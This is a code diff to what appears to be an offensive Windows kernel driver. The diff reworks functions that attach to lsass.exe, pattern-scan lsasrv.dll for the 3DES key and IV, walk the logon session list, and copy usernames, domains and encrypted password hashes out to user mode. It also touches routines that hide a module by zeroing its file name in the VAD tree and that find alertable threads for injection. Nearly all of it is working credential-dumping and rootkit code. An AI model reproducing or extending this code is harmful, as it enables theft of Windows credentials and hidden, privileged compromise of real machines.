+NTSTATUS MemoryHandler::DumpCredentials(_Out_ IoctlCredentialsInfoSize* allocationSize) {
 	NTSTATUS status = STATUS_SUCCESS;
 	KAPC_STATE state;
 	SIZE_T bytesWritten = 0;
@@ -738,26 +901,92 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 	ULONG credentialsIndex = 0;
 	ULONG validCredentialsCount = 0;
 	ULONG credentialsCount = 0;
-	PLSASRV_CREDENTIALS currentCredentials = nullptr;
+	ULONG lsassPid = 0;
+	UNICODE_STRING currentUsername = { 0 };
+	PMSV1_0_CREDENTIALS currentUserCreds = { 0 };
+	UNICODE_STRING currentUserDomain = { 0 };
+	PLIST_ENTRY currentCredentials = nullptr;
+	PEPROCESS currentProcess = PsGetCurrentProcess();
+
+	auto GetUser = [](PLIST_ENTRY currentCredentials) -> UNICODE_STRING {
+		UNICODE_STRING username = { 0 };
+
+		if (WindowsBuildNumber >= WIN_11_23H2) {
+			PLSASRV_CREDENTIALS_WIN23H2 creds = CONTAINING_RECORD(currentCredentials, LSASRV_CREDENTIALS_WIN23H2, Entry);
+			username = creds->UserName;
+		}
+		else {
+			PLSASRV_CREDENTIALS creds = CONTAINING_RECORD(currentCredentials, LSASRV_CREDENTIALS, Entry);
+			username = creds->UserName;
+		}
+		return username;
+	};
+
+	auto GetDomain = [](PLIST_ENTRY currentCredentials) -> UNICODE_STRING {
+		UNICODE_STRING domain = { 0 };
+		if (WindowsBuildNumber >= WIN_11_23H2) {
+			PLSASRV_CREDENTIALS_WIN23H2 creds = CONTAINING_RECORD(currentCredentials, LSASRV_CREDENTIALS_WIN23H2, Entry);
+			domain = creds->Domain;
+		}
+		else {
+			PLSASRV_CREDENTIALS creds = CONTAINING_RECORD(currentCredentials, LSASRV_CREDENTIALS, Entry);
+			domain = creds->Domain;
+		}
+		return domain;
+	};
+
+	auto GetCreds = [](PLIST_ENTRY currentCredentials) -> PMSV1_0_CREDENTIALS {
+		PMSV1_0_CREDENTIALS creds = nullptr;
+
+		if (WindowsBuildNumber >= WIN_11_23H2) {
+			PLSASRV_CREDENTIALS_WIN23H2 credsStruct = CONTAINING_RECORD(currentCredentials, LSASRV_CREDENTIALS_WIN23H2, Entry);
+			creds = credsStruct->Credentials;
+		}
+		else {
+			PLSASRV_CREDENTIALS credsStruct = CONTAINING_RECORD(currentCredentials, LSASRV_CREDENTIALS, Entry);
+			creds = credsStruct->Credentials;
+		}
+		return creds;
+	};
 
 	if (!allocationSize)
 		return STATUS_INVALID_PARAMETER;
 
-	if (cachedLsassInfo.Count != 0)
-		return STATUS_ABANDONED;
+	// If we have cached information, we can return the sizes right away.
+	if (cachedLsassInfo.Count != 0) {
+		allocationSize->CredentialsCount = cachedLsassInfo.Count;
+		allocationSize->DesKeySize = cachedLsassInfo.DesKey.Size;
+		allocationSize->IvSize = cachedLsassInfo.Iv.Size;
+		return STATUS_SUCCESS;
+	}
+
+	__try {
+		lsassPid = FindPidByName(L"lsass.exe");
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		return GetExceptionCode();
+	}
 
 	if (!lsassMetadata.Collected) {
-		status = GetLsassMetadata(lsass);
+		status = GetLsassMetadata(lsassPid);
 		lsassMetadata.Collected = NT_SUCCESS(status);
 
 		if (!lsassMetadata.Collected)
 			return status;
 	}
+	allocationSize->CredentialsCount = 0;
+
+	status = PsLookupProcessByProcessId(ULongToHandle(lsassPid), &lsass);
+
+	if (!NT_SUCCESS(status))
+		return status;
 	AutoLock locker(lsassMetadata.Lock);
 
 	KeStackAttachProcess(lsass, &state);
 	do {
 		AutoLock cacheLock(cachedLsassInfo.Lock);
+
+		// Copying DES key.
 		cachedLsassInfo.DesKey.Size = lsassMetadata.DesKey->hKey->key->hardkey.cbSecret;
 		cachedLsassInfo.DesKey.Data = AllocateMemory<PVOID>(cachedLsassInfo.DesKey.Size);
 
@@ -765,16 +994,30 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
 			break;
 		}
-		status = MmCopyVirtualMemory(lsass, lsassMetadata.DesKey->hKey->key->hardkey.data, IoGetCurrentProcess(),
+		status = MmCopyVirtualMemory(lsass, lsassMetadata.DesKey->hKey->key->hardkey.data, currentProcess,
 			cachedLsassInfo.DesKey.Data, cachedLsassInfo.DesKey.Size, KernelMode, &bytesWritten);
 
 		if (!NT_SUCCESS(status))
 			break;
 
-		currentCredentials = reinterpret_cast<PLSASRV_CREDENTIALS>(lsassMetadata.LogonSessionList->Flink);
+		// Copying IV.
+		cachedLsassInfo.Iv.Size = IV_DEFAULT_SIZE;
+		cachedLsassInfo.Iv.Data = AllocateMemory<PVOID>(cachedLsassInfo.Iv.Size);
+
+		if (!cachedLsassInfo.Iv.Data) {
+			status = STATUS_INSUFFICIENT_RESOURCES;
+			break;
+		}
+		status = MmCopyVirtualMemory(lsass, lsassMetadata.IvAddress, currentProcess, cachedLsassInfo.Iv.Data,
+			cachedLsassInfo.Iv.Size, KernelMode, &bytesWritten);
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		currentCredentials = lsassMetadata.LogonSessionList->Flink;
 
 		// Getting the real amount of credentials.
-		while (currentCredentials != reinterpret_cast<PLSASRV_CREDENTIALS>(lsassMetadata.LogonSessionList)) {
+		while (currentCredentials != lsassMetadata.LogonSessionList) {
 			credentialsCount++;
 			currentCredentials = currentCredentials->Flink;
 		}
@@ -783,83 +1026,163 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 			status = STATUS_NOT_FOUND;
 			break;
 		}
-		cachedLsassInfo.Creds = AllocateMemory<Credentials*>(credentialsCount * sizeof(Credentials));
+		cachedLsassInfo.Creds = AllocateMemory<IoctlCredentials*>(credentialsCount * sizeof(IoctlCredentials));
 
 		if (!cachedLsassInfo.Creds) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
 			break;
 		}
-		currentCredentials = reinterpret_cast<PLSASRV_CREDENTIALS>(lsassMetadata.LogonSessionList->Flink);
+		cachedLsassInfo.AllocationSize = AllocateMemory<IoctlCredentialsSize*>(credentialsCount * 
+			sizeof(IoctlCredentialsSize));
+
+		if (!cachedLsassInfo.AllocationSize) {
+			status = STATUS_INSUFFICIENT_RESOURCES;
+			break;
+		}
+		currentCredentials = lsassMetadata.LogonSessionList->Flink;
 
 		// Getting the interesting information.
 		for (credentialsIndex = 0; credentialsIndex < credentialsCount && 
-			currentCredentials != reinterpret_cast<PLSASRV_CREDENTIALS>(lsassMetadata.LogonSessionList);
+			currentCredentials != lsassMetadata.LogonSessionList;
 			credentialsIndex++, currentCredentials = currentCredentials->Flink) {
+			currentUsername = GetUser(currentCredentials);
+			currentUserCreds = GetCreds(currentCredentials);
+			currentUserDomain = GetDomain(currentCredentials);
 
-			if (currentCredentials->UserName.Length == 0 || !currentCredentials->Credentials)
+			if (currentUsername.Length == 0 || currentUserDomain.Length == 0 || !currentUserCreds)
 				continue;
 
-			if (!currentCredentials->Credentials->PrimaryCredentials)
+			if (!currentUserCreds->PrimaryCredentials)
 				continue;
 
-			if (currentCredentials->Credentials->PrimaryCredentials->Credentials.Length == 0)
+			if (currentUserCreds->PrimaryCredentials->Credentials.Length == 0)
 				continue;
 
-			cachedLsassInfo.Creds[credentialsIndex].Username.Buffer = NULL;
-			status = CopyUnicodeString(lsass, &currentCredentials->UserName, IoGetCurrentProcess(),
-				&cachedLsassInfo.Creds[credentialsIndex].Username, KernelMode);
-			
-			if (!NT_SUCCESS(status))
+			cachedLsassInfo.Creds[validCredentialsCount].Username.Buffer = AllocateMemory<WCHAR*>(currentUsername.MaximumLength);
+
+			if (!cachedLsassInfo.Creds[validCredentialsCount].Username.Buffer) {
+				status = STATUS_INSUFFICIENT_RESOURCES;
 				break;
+			}
+			status = CopyUnicodeString(lsass, 
+				&currentUsername, 
+				currentProcess,
+				&cachedLsassInfo.Creds[validCredentialsCount].Username, 
+				KernelMode);
+			
+			if (!NT_SUCCESS(status)) {
+				FreeVirtualMemory(cachedLsassInfo.Creds[validCredentialsCount].Username.Buffer);
+				break;
+			}
+			cachedLsassInfo.Creds[validCredentialsCount].Domain.Buffer = AllocateMemory<WCHAR*>(currentUserDomain.MaximumLength);
 
-			cachedLsassInfo.Creds[credentialsIndex].Domain.Buffer = NULL;
-			status = CopyUnicodeString(lsass, &currentCredentials->Domain, IoGetCurrentProcess(),
-				&cachedLsassInfo.Creds[credentialsIndex].Domain, KernelMode);
+			if (!cachedLsassInfo.Creds[validCredentialsCount].Domain.Buffer) {
+				FreeVirtualMemory(cachedLsassInfo.Creds[validCredentialsCount].Username.Buffer);
+				status = STATUS_INSUFFICIENT_RESOURCES;
+				break;
+			}
+			status = CopyUnicodeString(lsass, 
+				&currentUserDomain, 
+				currentProcess,
+				&cachedLsassInfo.Creds[validCredentialsCount].Domain, 
+				KernelMode);
 
 			if (!NT_SUCCESS(status)) {
-				FreeVirtualMemory(cachedLsassInfo.Creds[credentialsIndex].Username.Buffer);
+				FreeVirtualMemory(cachedLsassInfo.Creds[validCredentialsCount].Domain.Buffer);
+				FreeVirtualMemory(cachedLsassInfo.Creds[validCredentialsCount].Username.Buffer);
 				break;
 			}
 
-			cachedLsassInfo.Creds[credentialsIndex].EncryptedHash.Buffer = NULL;
-			status = CopyUnicodeString(lsass, &currentCredentials->Credentials->PrimaryCredentials->Credentials,
-				IoGetCurrentProcess(), &cachedLsassInfo.Creds[credentialsIndex].EncryptedHash, KernelMode);
-			
-			if (!NT_SUCCESS(status)) {
-				FreeVirtualMemory(cachedLsassInfo.Creds[credentialsIndex].Domain.Buffer);
-				FreeVirtualMemory(cachedLsassInfo.Creds[credentialsIndex].Username.Buffer);
+			cachedLsassInfo.Creds[validCredentialsCount].EncryptedHash.Buffer = AllocateMemory<WCHAR*>(
+				currentUserCreds->PrimaryCredentials->Credentials.Length);
+
+			if (!cachedLsassInfo.Creds[validCredentialsCount].EncryptedHash.Buffer) {
+				FreeVirtualMemory(cachedLsassInfo.Creds[validCredentialsCount].Domain.Buffer);
+				FreeVirtualMemory(cachedLsassInfo.Creds[validCredentialsCount].Username.Buffer);
+				status = STATUS_INSUFFICIENT_RESOURCES;
 				break;
 			}
+			status = CopyUnicodeString(lsass, &currentUserCreds->PrimaryCredentials->Credentials,
+				currentProcess, &cachedLsassInfo.Creds[validCredentialsCount].EncryptedHash, KernelMode);
+			
+			if (!NT_SUCCESS(status)) {
+				FreeVirtualMemory(cachedLsassInfo.Creds[validCredentialsCount].EncryptedHash.Buffer);
+				FreeVirtualMemory(cachedLsassInfo.Creds[validCredentialsCount].Domain.Buffer);
+				FreeVirtualMemory(cachedLsassInfo.Creds[validCredentialsCount].Username.Buffer);
+				break;
+			}
+			cachedLsassInfo.AllocationSize[validCredentialsCount].DomainAllocSize = currentUserDomain.MaximumLength;
+			cachedLsassInfo.AllocationSize[validCredentialsCount].UsernameAllocSize = currentUsername.MaximumLength;
+			cachedLsassInfo.AllocationSize[validCredentialsCount].EncryptedHashAllocSize =
+				cachedLsassInfo.Creds[validCredentialsCount].EncryptedHash.MaximumLength;
 			validCredentialsCount++;
 		}
 
 	} while (false);
 	KeUnstackDetachProcess(&state);
 
+	if (lsass)
+		ObDereferenceObject(lsass);
+
 	if (!NT_SUCCESS(status)) {
-		if (credentialsIndex > 0) {
-			for (ULONG i = 0; i < credentialsIndex; i++) {
-				FreeVirtualMemory(cachedLsassInfo.Creds[credentialsIndex].EncryptedHash.Buffer);
-				FreeVirtualMemory(cachedLsassInfo.Creds[credentialsIndex].Domain.Buffer);
-				FreeVirtualMemory(cachedLsassInfo.Creds[credentialsIndex].Username.Buffer);
+		if (validCredentialsCount > 0) {
+			for (ULONG i = 0; i < validCredentialsCount; i++) {
+				FreeVirtualMemory(cachedLsassInfo.Creds[i].EncryptedHash.Buffer);
+				FreeVirtualMemory(cachedLsassInfo.Creds[i].Domain.Buffer);
+				FreeVirtualMemory(cachedLsassInfo.Creds[i].Username.Buffer);
 			}
 		}
 
 		if (cachedLsassInfo.Creds)
 			FreeVirtualMemory(cachedLsassInfo.Creds);
 
+		if (cachedLsassInfo.AllocationSize)
+			FreeVirtualMemory(cachedLsassInfo.AllocationSize);
+
 		if (cachedLsassInfo.DesKey.Data)
 			FreeVirtualMemory(cachedLsassInfo.DesKey.Data);
-	}
-	else {
-		cachedLsassInfo.Count = validCredentialsCount;
-		*allocationSize = validCredentialsCount;
+
+		if (cachedLsassInfo.Iv.Data)
+			FreeVirtualMemory(cachedLsassInfo.Iv.Data);
+
+		return status;
 	}
 
-	if (lsass)
-		ObDereferenceObject(lsass);
-
+	cachedLsassInfo.Count = validCredentialsCount;
+	allocationSize->CredentialsCount = validCredentialsCount;
+	allocationSize->DesKeySize = cachedLsassInfo.DesKey.Size;
+	allocationSize->IvSize = cachedLsassInfo.Iv.Size;
 	return status;
+}
+
+/*
+* Description:
+* GetCredentialsSize is responsible for getting the required sizes for dumping credentials from lsass.
+* 
+* Parameters:
+* @credentialsSize [_Inout_ IoctlCredentialsSize*] -- Required information, contains the sizes to allocate for credentials buffer.
+* 
+* Returns:
+* @status		   [NTSTATUS]					   -- Whether successfuly got the sizes or not.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+NTSTATUS MemoryHandler::GetCredentialsSize(_Inout_ IoctlCredentialsSize* credentialsSize) {
+	if (!credentialsSize)
+		return STATUS_INVALID_PARAMETER;
+
+	MemoryGuard credentialGuard(credentialsSize,
+		static_cast<ULONG>(sizeof(IoctlCredentialsSize) * cachedLsassInfo.Count),
+		UserMode);
+
+	if (!credentialGuard.IsValid())
+		return STATUS_INVALID_PARAMETER;
+
+	for (ULONG i = 0; i < cachedLsassInfo.Count; i++) {
+		credentialsSize[i].DomainAllocSize = cachedLsassInfo.AllocationSize[i].DomainAllocSize;
+		credentialsSize[i].UsernameAllocSize = cachedLsassInfo.AllocationSize[i].UsernameAllocSize;
+		credentialsSize[i].EncryptedHashAllocSize = cachedLsassInfo.AllocationSize[i].EncryptedHashAllocSize;
+	}
+	return STATUS_SUCCESS;
 }
 
 /*
@@ -867,18 +1190,24 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 * GetLsassMetadata is responsible for collecting all the required information from lsass in order to decrypt credentials.
 * 
 * Parameters:
-* @lsass  [_Inout_ PEPROCESS&] -- The EPROCESS of lsass.
+* @lsassPid [ULONG]  -- Required information, contains lsass's PID.
 * 
 * Returns:
-* @status [NTSTATUS]		   -- Whether successfuly collected or not.
+* @status [NTSTATUS] -- Whether successfuly collected or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
+NTSTATUS MemoryHandler::GetLsassMetadata(_In_ ULONG lsassPid) {
 	KAPC_STATE state;
-	ULONG lsassPid = 0;
 	ULONG foundIndex = 0;
 	PVOID lsasrvMain = nullptr;
 	PVOID lsaIGetNbAndDnsDomainNames = nullptr;
+	WCHAR* mainDriveLetter = nullptr;
+	PEPROCESS lsass = nullptr;
+	const WCHAR lsasrvDll[] = L"\\Windows\\System32\\lsasrv.dll";
+	MemoryAllocator<WCHAR*> fullPath((DRIVE_LETTER_SIZE + wcslen(lsasrvDll)) * sizeof(WCHAR));
+
+	if (!fullPath.IsValid() || lsassPid <= SYSTEM_PROCESS_PID)
+		return STATUS_INSUFFICIENT_RESOURCES;
 
 	auto AlignAddress = [](ULONGLONG Address) -> ULONGLONG {
 		ULONG remain = Address % 8;
@@ -890,26 +1219,32 @@ NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
 	if (lsassMetadata.Collected)
 		return STATUS_SUCCESS;
 
-	__try {
-		lsassPid = FindPidByName(L"lsass.exe");
-	}
-	__except (EXCEPTION_EXECUTE_HANDLER) {
-		return GetExceptionCode();
-	}
-
 	NTSTATUS status = PsLookupProcessByProcessId(ULongToHandle(lsassPid), &lsass);
 
 	if (!NT_SUCCESS(status))
 		return status;
 
+	IrqlGuard irqlGuard(PASSIVE_LEVEL);
 	__try {
-		lsasrvMain = GetUserModeFuncAddress("LsaIAuditSamEvent", L"\\Windows\\System32\\lsasrv.dll", lsassPid);
-		lsaIGetNbAndDnsDomainNames = GetUserModeFuncAddress("LsaIGetNbAndDnsDomainNames", L"\\Windows\\System32\\lsasrv.dll", lsassPid);
+		mainDriveLetter = GetMainDriveLetter();
+		errno_t err = wcscpy_s(fullPath.Get(), DRIVE_LETTER_SIZE * sizeof(WCHAR), mainDriveLetter);
+
+		if (err != 0)
+			ExRaiseStatus(STATUS_INVALID_PARAMETER);
+		err = wcscat_s(fullPath.Get(), wcslen(lsasrvDll) * sizeof(WCHAR), lsasrvDll);
+
+		if (err != 0)
+			ExRaiseStatus(STATUS_INVALID_PARAMETER);
+		lsasrvMain = GetUserModeFuncAddress("LsaIAuditSamEvent", fullPath.Get(), lsassPid);
+		lsaIGetNbAndDnsDomainNames = GetUserModeFuncAddress("LsaIGetNbAndDnsDomainNames", fullPath.Get(), lsassPid);
 	}
 	__except (EXCEPTION_EXECUTE_HANDLER) {
+		FreeVirtualMemory(mainDriveLetter);
 		ObDereferenceObject(lsass);
 		return GetExceptionCode();
 	}
+	FreeVirtualMemory(mainDriveLetter);
+	irqlGuard.UnsetIrql();
 
 	KeStackAttachProcess(lsass, &state);
 	do {
@@ -928,7 +1263,7 @@ NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
 			break;
 		}
 		lsassMetadata.IvAddress = static_cast<PVOID>(static_cast<PUCHAR>(lsaInitializeProtectedMemory) +
-			(*ivAddressOffset) + foundIndex);
+			(*ivAddressOffset) + foundIndex + IvSignaturePattern.GetOffsetForVersion(WindowsBuildNumber));
 
 		// Getting 3DES key
 		PLONG desKeyAddressOffset = static_cast<PLONG>(FindPattern(DesKeySignaturePattern, lsaInitializeProtectedMemory, 
@@ -940,7 +1275,7 @@ NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
 		}
 		PBCRYPT_GEN_KEY desKey = reinterpret_cast<PBCRYPT_GEN_KEY>(static_cast<PUCHAR>(lsaInitializeProtectedMemory) +
 			(*desKeyAddressOffset) + foundIndex + DesKeyStructOffset);
-		status = ProbeAddress(desKey, sizeof(BCRYPT_GEN_KEY), sizeof(BCRYPT_GEN_KEY));
+		status = ProbeAddress(desKey, sizeof(BCRYPT_GEN_KEY), __alignof(BCRYPT_GEN_KEY));
 
 		if (!NT_SUCCESS(status))
 			break;
@@ -975,7 +1310,7 @@ NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
 
 		logonSessionListAddress = reinterpret_cast<PLIST_ENTRY>(AlignAddress(reinterpret_cast<ULONGLONG>(logonSessionListAddress)));
 
-		status = ProbeAddress(logonSessionListAddress, sizeof(PLSASRV_CREDENTIALS), sizeof(PLSASRV_CREDENTIALS));
+		status = ProbeAddress(logonSessionListAddress, sizeof(PLSASRV_CREDENTIALS), __alignof(PLSASRV_CREDENTIALS));
 
 		if (!NT_SUCCESS(status))
 			break;
@@ -984,8 +1319,10 @@ NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
 	} while (false);
 	KeUnstackDetachProcess(&state);
 
-	if (!NT_SUCCESS(status))
+	if (!NT_SUCCESS(status)) {
 		FreeVirtualMemory(lsassMetadata.DesKey);
+		ObDereferenceObject(lsass);
+	}
 	return status;
 }
 
@@ -1000,75 +1337,96 @@ NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
 * @status	 [NTSTATUS]			 -- Whether successfuly sent or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-NTSTATUS MemoryHandler::GetCredentials(_Inout_ IoctlCredentials* credentials) {
+NTSTATUS MemoryHandler::GetCredentials(_Inout_ IoctlCredentialsInformation* credentials) {
 	SIZE_T bytesWritten = 0;
 	SIZE_T i = 0;
 	NTSTATUS status = STATUS_SUCCESS;
+	PEPROCESS currentProcess = PsGetCurrentProcess();
 
-	if (!credentials)
+	if (!credentials ||
+		credentials->Count != cachedLsassInfo.Count ||
+		credentials->DesKey.Size != cachedLsassInfo.DesKey.Size ||
+		credentials->Iv.Size != cachedLsassInfo.Iv.Size)
 		return STATUS_INVALID_PARAMETER;
 	AutoLock lock(cachedLsassInfo.Lock);
 
-	if (credentials->Count != cachedLsassInfo.Count) {
-		credentials->Count = cachedLsassInfo.Count;
-		credentials->DesKey.Size = cachedLsassInfo.DesKey.Size;
-		credentials->Iv.Size = cachedLsassInfo.Iv.Size;
-		return STATUS_SUCCESS;
-	}
-	if (credentials->DesKey.Size != cachedLsassInfo.DesKey.Size) {
-		credentials->DesKey.Size = cachedLsassInfo.DesKey.Size;
-		return STATUS_SUCCESS;
-	}
-	if (credentials->Iv.Size != cachedLsassInfo.Iv.Size) {
-		credentials->Iv.Size = cachedLsassInfo.Iv.Size;
-		return STATUS_SUCCESS;
-	}
-
 	MemoryGuard desKeyGuard(credentials->DesKey.Data, cachedLsassInfo.DesKey.Size, UserMode);
 	MemoryGuard ivGuard(credentials->Iv.Data, cachedLsassInfo.Iv.Size, UserMode);
-	MemoryGuard credentialGuard(credentials->Creds, static_cast<ULONG>(sizeof(Credentials) * cachedLsassInfo.Count), UserMode);
+	MemoryGuard credentialGuard(credentials->Creds, 
+		static_cast<ULONG>(sizeof(IoctlCredentials) * cachedLsassInfo.Count), 
+		UserMode);
 
 	if (!desKeyGuard.IsValid() || !credentialGuard.IsValid() || !ivGuard.IsValid())
 		return STATUS_INVALID_ADDRESS;
-	status = MmCopyVirtualMemory(IoGetCurrentProcess(), cachedLsassInfo.DesKey.Data,
-		IoGetCurrentProcess(), credentials->DesKey.Data, cachedLsassInfo.DesKey.Size, KernelMode, &bytesWritten);
+
+	status = MmCopyVirtualMemory(currentProcess, 
+		cachedLsassInfo.DesKey.Data,
+		currentProcess, 
+		credentials->DesKey.Data, 
+		cachedLsassInfo.DesKey.Size, 
+		KernelMode, 
+		&bytesWritten);
 
 	if (!NT_SUCCESS(status))
 		return status;
 
-	status = MmCopyVirtualMemory(IoGetCurrentProcess(), cachedLsassInfo.Iv.Data,
-		IoGetCurrentProcess(), credentials->Iv.Data, cachedLsassInfo.Iv.Size, KernelMode, &bytesWritten);
+	status = MmCopyVirtualMemory(currentProcess, 
+		cachedLsassInfo.Iv.Data,
+		currentProcess, 
+		credentials->Iv.Data, 
+		cachedLsassInfo.Iv.Size, 
+		KernelMode, 
+		&bytesWritten);
 
 	if (!NT_SUCCESS(status))
 		return status;
 
 	for (i = 0; i < credentials->Count; i++) {
-		status = CopyUnicodeString(IoGetCurrentProcess(), &credentials->Creds[i].Username, IoGetCurrentProcess(),
-			&credentials->Creds[i].Username, UserMode);
+		credentials->Creds[i].Username.Length = cachedLsassInfo.Creds[i].Username.Length;
+		credentials->Creds[i].Username.MaximumLength = cachedLsassInfo.Creds[i].Username.MaximumLength;
+
+		status = MmCopyVirtualMemory(currentProcess, 
+			cachedLsassInfo.Creds[i].Username.Buffer,
+			currentProcess, 
+			credentials->Creds[i].Username.Buffer, 
+			cachedLsassInfo.Creds[i].Username.MaximumLength,
+			KernelMode, 
+			&bytesWritten);
 
 		if (!NT_SUCCESS(status))
 			break;
-		status = CopyUnicodeString(IoGetCurrentProcess(), &credentials->Creds[i].Domain, IoGetCurrentProcess(),
-			&credentials->Creds[i].Domain, UserMode);
+		credentials->Creds[i].Domain.Length = cachedLsassInfo.Creds[i].Domain.Length;
+		credentials->Creds[i].Domain.MaximumLength = cachedLsassInfo.Creds[i].Domain.MaximumLength;
+
+		status = MmCopyVirtualMemory(currentProcess, 
+			cachedLsassInfo.Creds[i].Domain.Buffer,
+			currentProcess, 
+			credentials->Creds[i].Domain.Buffer, 
+			cachedLsassInfo.Creds[i].Domain.MaximumLength,
+			KernelMode, 
+			&bytesWritten);
 
 		if (!NT_SUCCESS(status))
 			break;
-		status = CopyUnicodeString(IoGetCurrentProcess(), &credentials->Creds[i].EncryptedHash, IoGetCurrentProcess(),
-			&credentials->Creds[i].EncryptedHash, UserMode);
+		credentials->Creds[i].EncryptedHash.Length = cachedLsassInfo.Creds[i].EncryptedHash.Length;
+		credentials->Creds[i].EncryptedHash.MaximumLength = cachedLsassInfo.Creds[i].EncryptedHash.MaximumLength;
+
+		status = MmCopyVirtualMemory(currentProcess, 
+			cachedLsassInfo.Creds[i].EncryptedHash.Buffer,
+			currentProcess, 
+			credentials->Creds[i].EncryptedHash.Buffer, 
+			cachedLsassInfo.Creds[i].EncryptedHash.MaximumLength,
+			KernelMode, 
+			&bytesWritten);
 
 		if (!NT_SUCCESS(status))
 			break;
 	}
-	if (!NT_SUCCESS(status)) {
-		for (size_t j = 0; j <= i; j++) {
-			FreeVirtualMemory(credentials->Creds[j].Username.Buffer);
-			FreeVirtualMemory(credentials->Creds[j].Domain.Buffer);
-			FreeVirtualMemory(credentials->Creds[j].EncryptedHash.Buffer);
-		}
+	if (!NT_SUCCESS(status))
 		return status;
-	}
 
 	cachedLsassInfo.Count = 0;
+	FreeVirtualMemory(cachedLsassInfo.AllocationSize);
 	FreeVirtualMemory(cachedLsassInfo.Creds);
 	FreeVirtualMemory(cachedLsassInfo.DesKey.Data);
 	FreeVirtualMemory(cachedLsassInfo.Iv.Data);
@@ -1154,7 +1512,7 @@ NTSTATUS MemoryHandler::VadHideObject(_Inout_ PEPROCESS process, _In_ ULONG_PTR 
 	if (vadRootOffset == 0 || pageCommitmentLockOffset == 0)
 		return STATUS_INVALID_ADDRESS;
 
-	PRTL_AVL_TABLE vadTable = reinterpret_cast<PRTL_AVL_TABLE>(reinterpret_cast<PUCHAR>(process) + vadRootOffset);
+	PRTL_AVL_TABLE vadTable = *reinterpret_cast<PRTL_AVL_TABLE*>(reinterpret_cast<PUCHAR>(process) + vadRootOffset);
 	EX_PUSH_LOCK pageTableCommitmentLock = reinterpret_cast<EX_PUSH_LOCK>(reinterpret_cast<PUCHAR>(process) + pageCommitmentLockOffset);
 	TABLE_SEARCH_RESULT res = VadFindNodeOrParent(vadTable, targetAddressStart, &pageTableCommitmentLock, &node);
 
@@ -1177,14 +1535,14 @@ NTSTATUS MemoryHandler::VadHideObject(_Inout_ PEPROCESS process, _In_ ULONG_PTR 
 		PFILE_OBJECT fileObject = reinterpret_cast<PFILE_OBJECT>(longNode->Subsection->ControlArea->FilePointer.Value & ~0xF);
 
 		if (fileObject->FileName.Length > 0) {
-			moduleEntry.ModuleName = AllocateMemory<WCHAR*>(fileObject->FileName.MaximumLength + sizeof(wchar_t));
+			moduleEntry.VadModuleName = AllocateMemory<WCHAR*>(fileObject->FileName.MaximumLength + sizeof(wchar_t));
 
-			if (!moduleEntry.ModuleName)
+			if (!moduleEntry.VadModuleName)
 				return STATUS_INSUFFICIENT_RESOURCES;
-			errno_t err = wcscpy_s(moduleEntry.ModuleName, fileObject->FileName.Length + sizeof(wchar_t), fileObject->FileName.Buffer);
+			errno_t err = wcscpy_s(moduleEntry.VadModuleName, fileObject->FileName.Length + sizeof(wchar_t), fileObject->FileName.Buffer);
 
 			if (err != 0) {
-				FreeVirtualMemory(moduleEntry.ModuleName);
+				FreeVirtualMemory(moduleEntry.VadModuleName);
 				return STATUS_UNSUCCESSFUL;
 			}
 			RtlSecureZeroMemory(fileObject->FileName.Buffer, fileObject->FileName.Length);
@@ -1244,8 +1602,8 @@ TABLE_SEARCH_RESULT MemoryHandler::VadFindNodeOrParent(_In_ PRTL_AVL_TABLE table
 		startAddress = static_cast<ULONG_PTR>(virtualAddressToCompare->StartingVpn);
 		endAddress = static_cast<ULONG_PTR>(virtualAddressToCompare->EndingVpn);
 
-		startAddress |= static_cast<ULONG_PTR>(virtualAddressToCompare->StartingVpnHigh) << 32;
-		endAddress |= static_cast<ULONG_PTR>(virtualAddressToCompare->EndingVpnHigh) << 32;
+		startAddress |= static_cast<ULONG_PTR>(virtualAddressToCompare->StartingVpnHigh) << VPN_SHIFT;
+		endAddress |= static_cast<ULONG_PTR>(virtualAddressToCompare->EndingVpnHigh) << VPN_SHIFT;
 
 		if (targetPageAddress < startAddress) {
 			child = nodeToCheck->Left;
@@ -1296,6 +1654,7 @@ PETHREAD MemoryHandler::FindAlertableThread(_In_ HANDLE pid) {
 	ULONG guiThread = 0;
 	PETHREAD targetThread = NULL;
 	PSYSTEM_PROCESS_INFO info = NULL;
+	PSYSTEM_PROCESS_INFO originalInfo = NULL;
 	ULONG infoSize = 0;
 
 	NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &infoSize);
@@ -1316,6 +1675,7 @@ PETHREAD MemoryHandler::FindAlertableThread(_In_ HANDLE pid) {
 		FreeVirtualMemory(info);
 		ExRaiseStatus(status);
 	}
+	originalInfo = info;
 	status = STATUS_NOT_FOUND;
 
 	// Iterating the processes information until our pid is found.
@@ -1328,7 +1688,7 @@ PETHREAD MemoryHandler::FindAlertableThread(_In_ HANDLE pid) {
 	}
 
 	if (!NT_SUCCESS(status)) {
-		FreeVirtualMemory(info);
+		FreeVirtualMemory(originalInfo);
 		ExRaiseStatus(status);
 	}
 
@@ -1362,7 +1722,7 @@ PETHREAD MemoryHandler::FindAlertableThread(_In_ HANDLE pid) {
 		}
 		break;
 	}
-	FreeVirtualMemory(info);
+	FreeVirtualMemory(originalInfo);
 
 	if (!targetThread)
 		ExRaiseStatus(STATUS_NOT_FOUND);
@@ -1408,7 +1768,7 @@ HiddenModuleEntry* MemoryHandler::FindHiddenModule(_In_ IoctlHiddenModuleInfo& i
 */
